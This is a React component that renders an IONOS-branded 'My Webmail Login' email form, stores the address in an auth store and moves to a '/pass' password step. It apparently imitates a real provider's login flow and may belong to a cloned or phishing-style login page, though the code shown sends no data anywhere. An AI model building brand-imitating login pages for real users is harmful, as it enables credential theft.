import envelope from "../assets/product-email.svg";
import account from "../assets/my-account.svg";
import hidrive from "../assets/product-hidrive.svg";
import archive from "../assets/product-mail-archiving.svg";
import { Link, useNavigate } from "react-router-dom";
import { FormEvent, useEffect, useState } from "react";
import useAuthStore from "../zustand_store/AuthStore";

const Identifier = () => {
  const email = useAuthStore((e) => e.email);
  const setEmail = useAuthStore((e) => e.setEmail);
  const [isEmailValid, setIsEmailValid] = useState(true);
  const navigate = useNavigate();

  const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setIsEmailValid(false);
      return;
    }

    navigate("/pass");
  };
  isEmailValid;

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  return (
    <div className="px-3 mb-20">
      <div className="flex flex-col justify-between w-full md:w-[400px] lg:w-[600px] mx-auto border border-gray-400 overflow-hidden rounded-2xl mb-5">
        <div className="px-6 py-7 bg-white">
          <div className="flex items-center gap-3 mb-10">
            <div>
              <img className="w-[70px] h-[70px]" src={envelope} alt="" />
            </div>
            <h1 className="text-xl font-semibold text-blue-950">
              My Webmail Login
            </h1>
          </div>
          <form onSubmit={handleSubmit}>
            <div className="flex flex-col gap-y-2 ">
              <label htmlFor="email">E-mail address</label>
              <div className="rounded-lg border border-gray-500 overflow-hidden">
                <input
                  id="email"
                  type="email"
                  className="w-full outline-none p-2"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    setIsEmailValid(true);
                  }}
                  required
                />
              </div>

              <p className="text-blue-950 mb-5">
                <span className="font-semibold text-blue-950">
                  Not your device?
                </span>{" "}
                Sign out after your session or use private browsing mode.
              </p>

              <button
                type="submit"
                className="w-full bg-blue-950 hover:bg-blue-700 text-white py-2 font-semibold rounded-3xl"
              >
                Further
              </button>
            </div>
          </form>
        </div>
        <div className="bg-[#F4F7FA] px-6 py-7">
          <p className="text-blue-950">
            You don’t have a professional email inbox yet?
          </p>
          <a href="#" className="text-blue-600">
            Learn more
          </a>
        </div>
      </div>
      <div className="w-full md:w-[400px] lg:w-[600px] mx-auto">
        <p className="text-xl mb-5">More IONOS logins</p>
        <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
          <div className="border text-center bg-white py-6 rounded-lg hover:shadow-[0px_4px_10px_rgba(0,0,0,0.2)]">
            <Link to="/de">
              <img
                src={account}
                className="w-[80px] h-[80px] mx-auto mb-2"
                alt=""
              />
            </Link>
            <p>My IONOS</p>
          </div>
          <div className="border text-center bg-white py-6 rounded-lg hover:shadow-[0px_4px_10px_rgba(0,0,0,0.2)]">
            <div>
              <img
                src={hidrive}
                className="w-[80px] h-[80px] mx-auto mb-2"
                alt=""
              />
            </div>
            <p>HiDrive</p>
          </div>
          <div className="border text-center bg-white py-6 rounded-lg hover:shadow-[0px_4px_10px_rgba(0,0,0,0.2)]">
            <div>
              <img
                src={archive}
                className="w-[80px] h-[80px] mx-auto mb-2"
                alt=""
              />
            </div>
            <p>Email Archive</p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Identifier;
